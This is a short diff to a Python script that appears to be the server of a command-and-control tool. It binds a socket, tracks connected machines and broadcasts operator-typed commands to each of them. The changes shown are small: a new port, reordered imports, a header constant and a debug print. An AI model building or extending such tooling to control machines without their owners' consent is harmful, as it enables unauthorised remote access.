@@ -3,23 +3,23 @@ import socket
 import threading
 import tqdm
 import os
-from C2utils import snd_msg, get_msg, snd_file, get_file
+from C2utils import snd_file, get_file, snd_msg, get_msg
 
 #############################
 ## ========  Config  ========
-PORT = 5054             ## CONFIGURE THIS
+PORT = 5050             ## CONFIGURE THIS
 #SERVER = '10.96.10.191' ## CONFIGURE THIS
 SERVER = socket.gethostbyname(socket.gethostname())
 ## --------------------------
 ADDR = (SERVER, PORT)
 FORMAT = 'utf-8'
+HEADER = 64
 #############################
 
 ## ========  Globals  ========
 server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 server.bind(ADDR)
 connected_machines = []
-
             
 # Processes the user input
 def handle_user():
@@ -41,6 +41,7 @@ def handle_user():
             itr = 1
             for data in connected_machines:
                 print(f"{str(itr)}) {data['addr'][0]}")
+                print("sending " + new_cmd)
                 snd_msg(data['conn'], new_cmd)
                 resp = get_msg(data['conn'])
                 print(resp)
